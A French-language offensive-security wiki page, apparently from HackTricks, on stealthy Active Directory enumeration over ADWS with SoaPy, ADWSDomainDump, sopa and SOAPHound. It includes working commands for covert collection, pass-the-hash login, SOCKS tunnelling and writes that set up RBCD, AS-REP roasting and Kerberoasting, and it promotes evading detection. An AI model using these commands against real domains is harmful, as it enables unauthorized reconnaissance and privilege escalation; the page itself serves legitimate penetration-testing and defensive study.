# Énumération d’Active Directory Web Services (ADWS) et collecte furtive

{{#include ../../banners/hacktricks-training.md}}

## Qu’est-ce qu’ADWS ?

Active Directory Web Services (ADWS) est **activé par défaut sur chaque Domain Controller depuis Windows Server 2008 R2** et écoute sur le port TCP **9389**. Malgré son nom, **aucun protocole HTTP n’est impliqué**. Le service expose plutôt des données de type LDAP via une pile de protocoles propriétaires de framing .NET :<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Comme le trafic est encapsulé dans ces frames SOAP binaires et transite par un port peu courant, **l’énumération via ADWS a beaucoup moins de chances d’être inspectée, filtrée ou identifiée par signature que le trafic LDAP/389 et 636 classique**. Pour les operators, cela signifie :<sup>[[1]](#references)[[7]](#references)</sup>

* Recon plus furtive – Les équipes Blue se concentrent souvent sur les requêtes LDAP.
* Liberté de collecter depuis des **hôtes non-Windows (Linux, macOS)** en tunnellant 9389/TCP via un proxy SOCKS.
* Les mêmes données que celles obtenues via LDAP (users, groups, ACLs, schema, etc.), ainsi que la possibilité d’effectuer des **writes** (par exemple `msDs-AllowedToActOnBehalfOfOtherIdentity` pour **RBCD**).

Les interactions ADWS sont implémentées via WS-Enumeration : chaque requête commence par un message `Enumerate` qui définit le filtre/les attributs LDAP et renvoie un GUID `EnumerationContext`, suivi d’un ou plusieurs messages `Pull` qui transmettent les résultats jusqu’à la limite définie par le serveur.<sup>[[7]](#references)</sup> Les contexts expirent après environ 30 minutes ; les tools doivent donc paginer les résultats ou diviser les filtres (requêtes par préfixe pour chaque CN) afin d’éviter de perdre l’état.<sup>[[8]](#references)</sup> Lors de la récupération de security descriptors, spécifiez le control `LDAP_SERVER_SD_FLAGS_OID` pour exclure les SACLs ; sinon, ADWS supprime simplement l’attribut `nTSecurityDescriptor` de sa réponse SOAP.

> NOTE: ADWS est également utilisé par de nombreux tools RSAT GUI/PowerShell, le trafic peut donc se confondre avec une activité d’administration légitime.

## SoaPy – Client Python natif

[SoaPy](https://github.com/logangoins/soapy) est une **réimplémentation complète de la stack de protocoles ADWS en Python pur**. Il construit les frames NBFX/NBFSE/NNS/NMF octet par octet, permettant la collecte depuis des systèmes de type Unix sans utiliser le runtime .NET.<sup>[[1]](#references)[[2]](#references)</sup>

### Fonctionnalités principales

* Support du **proxying via SOCKS** (utile depuis des implants C2).
* Filtres de recherche précis, identiques à LDAP `-q '(objectClass=user)'`.
* Opérations de **write** optionnelles (`--set` / `--delete`).
* **Mode de sortie BOFHound** pour une ingestion directe dans BloodHound.
* Flag `--parse` pour rendre les timestamps / `userAccountControl` plus lisibles lorsqu’une lecture humaine est nécessaire.<sup>[[2]](#references)</sup>

### Flags de collecte ciblée et opérations de write

SoaPy fournit des switches dédiés qui reproduisent les tâches LDAP hunting les plus courantes via ADWS : `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, ainsi que les options brutes `--query` / `--filter` pour les pulls personnalisés. Associez-les à des primitives de write telles que `--rbcd <source>` (définit `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (staging de SPN pour un Kerberoasting ciblé) et `--asrep` (active `DONT_REQ_PREAUTH` dans `userAccountControl`).<sup>[[2]](#references)</sup>

Exemple de hunt SPN ciblé qui renvoie uniquement `samAccountName` et `servicePrincipalName` :
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Utilisez le même hôte et les mêmes identifiants pour exploiter immédiatement les résultats : énumérez les objets capables de RBCD avec `--rbcds`, puis appliquez `--rbcd 'WEBSRV01$' --account 'FILE01$'` afin de préparer une chaîne de Resource-Based Constrained Delegation (consultez [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) pour connaître la procédure complète d’abus).

### Installation (hôte opérateur)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump via ADWS (Linux/Windows)

* Fork de `ldapdomaindump` qui remplace les requêtes LDAP par des appels ADWS sur TCP/9389 afin de réduire les détections de signatures LDAP.
* Effectue un test initial d'accessibilité du port 9389, sauf si `--force` est passé (ignore la sonde si les scans de ports sont bruyants ou filtrés).
* Testé avec Microsoft Defender for Endpoint et CrowdStrike Falcon, avec un bypass réussi indiqué dans le README.<sup>[[4]](#references)</sup>

### Installation
```bash
pipx install .
```
### Utilisation
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
La sortie typique journalise la vérification d'accessibilité du port 9389, la liaison ADWS et le début/la fin du dump :
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Un client pratique pour ADWS en Golang

De même que soapy, [sopa](https://github.com/Macmod/sopa) implémente la pile de protocoles ADWS (MS-NNS + MC-NMF + SOAP) en Golang, en exposant des options en ligne de commande pour effectuer des appels ADWS tels que :<sup>[[5]](#references)</sup>

* **Recherche et récupération d’objets** - `query` / `get`
* **Cycle de vie des objets** - `create [user|computer|group|ou|container|custom]` et `delete`
* **Modification des attributs** - `attr [add|replace|delete]`
* **Gestion des comptes** - `set-password` / `change-password`
* et d’autres tels que `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

### Points importants du mapping des protocoles

* Les recherches de style LDAP sont effectuées via **WS-Enumeration** (`Enumerate` + `Pull`) avec projection des attributs, contrôle de la portée (Base/OneLevel/Subtree) et pagination.
* La récupération d’un objet unique utilise **WS-Transfer** `Get` ; les modifications d’attributs utilisent `Put` ; les suppressions utilisent `Delete`.
* La création d’objets intégrée utilise **WS-Transfer ResourceFactory** ; les objets custom utilisent une **IMDA AddRequest** pilotée par des templates YAML.
* Les opérations sur les mots de passe sont des actions **MS-ADCAP** (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Découverte de métadonnées sans authentification (mex)

ADWS expose WS-MetadataExchange sans credentials, ce qui constitue un moyen rapide de valider l’exposition avant de s’authentifier :<sup>[[5]](#references)</sup>
```bash
sopa mex --dc <DC>
```
### Notes sur la découverte DNS/DC et le ciblage Kerberos

Sopa peut résoudre les DC via SRV si `--dc` est omis et que `--domain` est fourni. Il interroge dans cet ordre et utilise la cible avec la priorité la plus élevée :<sup>[[5]](#references)</sup>
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
Opérationnellement, préférez un resolver contrôlé par un DC afin d’éviter les échecs dans les environnements segmentés :

* Utilisez `--dns <DC-IP>` afin que **toutes** les recherches SRV/PTR/directes passent par le DNS du DC.
* Utilisez `--dns-tcp` lorsque l’UDP est bloqué ou que les réponses SRV sont volumineuses.
* Si Kerberos est activé et que `--dc` est une IP, sopa effectue une **recherche PTR inverse** pour obtenir un FQDN et cibler correctement le SPN/KDC. Si Kerberos n’est pas utilisé, aucune recherche PTR n’est effectuée.

Exemple (IP + Kerberos, DNS forcé via le DC) :
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Options de matériel d’authentification

En plus des mots de passe en clair, sopa prend en charge les **NT hashes**, les **clés AES Kerberos**, les **ccache** et les **certificats PKINIT** (PFX ou PEM) pour l’authentification ADWS. Kerberos est implicite lors de l’utilisation de `--aes-key`, de `-c` (ccache) ou des options basées sur des certificats.<sup>[[5]](#references)</sup>
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### Création d’objets personnalisés via des templates

Pour les classes d’objets arbitraires, la commande `create custom` utilise un template YAML correspondant à une `AddRequest` IMDA :<sup>[[5]](#references)</sup>

* `parentDN` et `rdn` définissent le conteneur et le DN relatif.
* `attributes[].name` prend en charge `cn` ou `addata:cn` avec namespace.
* `attributes[].type` accepte `string|int|bool|base64|hex` ou un `xsd:*` explicite.
* N’incluez pas `ad:relativeDistinguishedName` ni `ad:container-hierarchy-parent` ; sopa les injecte.
* Les valeurs `hex` sont converties en `xsd:base64Binary` ; utilisez `value: ""` pour définir des chaînes vides.

## SOAPHound – Collection ADWS à grande échelle (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) est un collector .NET qui conserve toutes les interactions LDAP dans ADWS et génère des JSON compatibles avec BloodHound v4. Il crée une cache complète de `objectSid`, `objectGUID`, `distinguishedName` et `objectClass` une seule fois (`--buildcache`), puis la réutilise pour les passes à grande échelle `--bhdump`, `--certdump` (ADCS) ou `--dnsdump` (DNS intégré à AD), de sorte que seuls environ 35 attributs critiques quittent le DC. AutoSplit (`--autosplit --threshold <N>`) segmente automatiquement les requêtes selon le préfixe CN afin de rester sous le délai d’expiration de 30 minutes d’EnumerationContext dans les grandes forêts.<sup>[[8]](#references)</sup>

Workflow typique sur une VM opérateur jointe au domaine :
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Exportez directement les slots JSON dans les workflows SharpHound/BloodHound — consultez la [BloodHound methodology](bloodhound.md) pour des idées de graphes en aval. AutoSplit rend SOAPHound résilient dans les forêts contenant plusieurs millions d’objets, tout en maintenant un nombre de requêtes inférieur à celui des snapshots de type ADExplorer.

## Workflow de collecte AD furtive

Le workflow suivant montre comment énumérer les **objets de domaine et ADCS** via ADWS, les convertir en JSON BloodHound et rechercher des chemins d’attaque basés sur les certificats — le tout depuis Linux :

1. **Tunneler 9389/TCP** depuis le réseau cible vers votre machine (par exemple via Chisel, Meterpreter, un port forwarding dynamique SSH, etc.). Exportez `export HTTPS_PROXY=socks5://127.0.0.1:1080` ou utilisez `--proxyHost/--proxyPort` de SoaPy.

2. **Collecter l’objet du domaine racine :**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Collecter les objets liés à ADCS depuis la Configuration NC :**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Convertir en BloodHound :**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Téléversez le ZIP** dans l’interface graphique de BloodHound et exécutez des requêtes cypher telles que `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` pour révéler les chemins d’escalade de certificats (ESC1, ESC8, etc.).

### Écriture de `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Combinez ceci avec `s4u2proxy`/`Rubeus /getticket` pour une chaîne complète de **Resource-Based Constrained Delegation** (voir [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Résumé des outils

| Objectif | Outil | Notes |
|---------|------|-------|
| Énumération ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, lecture/écriture |
| Dump ADWS à haut volume | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, priorité au cache, modes BH/ADCS/DNS |
| Import dans BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Convertit les logs de SoaPy/ldapsearch |
| Compromission de certificats | [Certipy](https://github.com/ly4k/Certipy) | Peut être proxyfié via le même SOCKS |
| Énumération ADWS et modification d’objets | [sopa](https://github.com/Macmod/sopa) | Client générique pour interfacer avec les endpoints ADWS connus - permet l’énumération, la création d’objets, la modification d’attributs et les changements de mot de passe |

## Références

- [1] [SpecterOps – Veillez à utiliser SOAP(y) – Guide de l’opérateur pour une collecte AD furtive via ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – Spécifications MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Énumération furtive des environnements Active Directory via ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – Outil SOAPHound pour collecter des données Active Directory via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
